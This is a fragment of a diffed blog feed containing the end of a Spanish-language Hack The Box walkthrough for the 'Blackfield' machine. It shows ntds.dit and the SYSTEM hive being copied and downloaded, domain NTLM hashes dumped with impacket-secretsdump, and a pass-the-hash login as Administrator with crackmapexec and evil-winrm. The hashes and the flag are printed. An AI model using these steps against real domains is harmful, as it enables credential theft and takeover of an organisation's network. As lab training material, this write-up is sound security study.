- 56.9%
- 57.2%
- 57.6%
- 57.9%
- 58.3%
- 58.6%
- 59.0%
- 59.3%
- 59.7%
- 60.0%
- 60.4%
- 60.7%
- 61.1%
- 61.4%
- 61.8%
- 62.1%
- 62.5%
- 62.8%
- 63.1%
- 63.5%
- 63.8%
- 64.2%
- 64.5%
- 64.9%
- 65.2%
- 65.6%
- 65.9%
- 66.3%
- 66.6%
- 67.0%
- 67.3%
- 67.7%
- 68.0%
- 68.4%
- 68.7%
- 69.0%
- 69.4%
- 69.7%
- 70.1%
- 70.4%
- 70.8%
- 71.1%
- 71.5%
- 71.8%
- 72.2%
- 72.5%
- 72.9%
- 73.2%
- 73.6%
- 73.9%
- 74.3%
- 74.6%
- 75.0%
- 75.3%
- 75.6%
- 76.0%
- 76.3%
- 76.7%
- 77.0%
- 77.4%
- 77.7%
- 78.1%
- 78.4%
- 78.8%
- 79.1%
- 79.5%
- 79.8%
- 80.2%
- 80.5%
- 80.9%
- 81.2%
- 81.5%
- 81.9%
- 82.2%
- 82.6%
- 82.9%
- 83.3%
- 83.6%
- 84.0%
- 84.3%
- 84.7%
- 85.0%
- 85.4%
- 85.7%
- 86.1%
- 86.4%
- 86.8%
- 87.1%
- 87.5%
- 87.8%
- 88.1%
- 88.5%
- 88.8%
- 89.2%
- 89.5%
- 89.9%
- 90.2%
- 90.6%
- 90.9%
- 91.3%
- 91.6%
- 92.0%
- 92.3%
- 92.7%
- 93.0%
- 93.4%
- 93.7%
- 94.0%
- 94.4%
- 94.7%
- 95.1%
- 95.4%
- 95.8%
- 96.1%
- 96.5%
- 96.8%
- 97.2%
- 97.5%
- 97.9%
- 98.2%
- 98.6%
- 98.9%
- 99.3%
- 99.6%
-100%
-100%
-
-<span class="nt">------------------------------------------------------------------------------</span>
-
-               Total    Copied   Skipped  Mismatch    FAILED    Extras
-    Dirs :         1         0         1         0         0         0
-   Files :         1         1         0         0         0         0
-   Bytes :   18.00 m   18.00 m         0         0         0         0
-   Times :   0:00:00   0:00:00                       0:00:00   0:00:00
-
-
-   Speed :           171585163 Bytes/sec.
-   Speed :            9818.181 MegaBytes/min.
-   Ended : Saturday, April 20, 2024 7:12:11 PM
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
-
-
-    </span>Directory: C:<span class="se">\T</span>emp
-
-
-Mode                LastWriteTime         Length Name
-<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
-<span class="nt">-a----</span>        4/20/2024   7:06 PM            615 2024-04-20_19-06-01_DC01.cab
-<span class="nt">-a----</span>        4/20/2024   5:43 PM       18874368 ntds.dit
-<span class="nt">-a----</span>        4/20/2024   6:42 PM       17375232 system
-<span class="nt">-a----</span>        4/20/2024   7:04 PM             96 zi.txt
-
-
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt;
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora ya lo podemos descargar.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\T</span>emp&gt; download C:<span class="se">\T</span>emp<span class="se">\n</span>tds.dit
-</code></pre></div></div>
-
-<ul>
-  <li>Una vez nos descargamos el <code class="language-plaintext highlighter-rouge">ntds.dit</code> y el system ya podemos usar <code class="language-plaintext highlighter-rouge">impacket-secretsdump</code> para ver los hashes del usuarios del dominio.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-secretsdump <span class="nt">-system</span> system <span class="nt">-ntds</span> ntds.dit LOCAL
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span><span class="nb">id</span>:rid:lmhash:nthash<span class="o">)</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Searching <span class="k">for </span>pekList, be patient
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> PEK <span class="c"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reading and decrypting hashes from ntds.dit
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
-Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-DC01<span class="nv">$:</span>1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
-krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
-audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
-support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
-</code></pre></div></div>
-
-<h2 id="roottxt">root.txt</h2>
-
-<ul>
-  <li>Ahora ya podemos validar el hash y conectarnos para leer la ultima flag.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.23.192 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>
-SMB         10.129.23.192   445    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:BLACKFIELD.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.23.192   445    DC01             <span class="o">[</span>+] BLACKFIELD.local<span class="se">\A</span>dministrator:184fb5e5178480be64824d4cd53b99ee <span class="o">(</span>Pwn3d!<span class="o">)</span>
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.23.192 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'184fb5e5178480be64824d4cd53b99ee'</span>
-
-Evil-WinRM shell v3.5
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
-</span>blackfield<span class="se">\a</span>dministrator
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>root.txt
-4375a629c7c67c8e29db269060c955cb
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos que dejaron una nota.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>notes.txt
-Mates,
-
-After the domain compromise and computer forensic last week, auditors advised us to:
-- change every passwords <span class="nt">--</span> Done.
-- change krbtgt password twice <span class="nt">--</span> Done.
-- disable auditor<span class="s1">'s account (audit2020) -- KO.
-- use nominative domain admin accounts instead of this one -- KO.
-
-We will probably have to backup &amp; restore things later.
-- Mike.
-
-PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
-</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry></feed>
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>
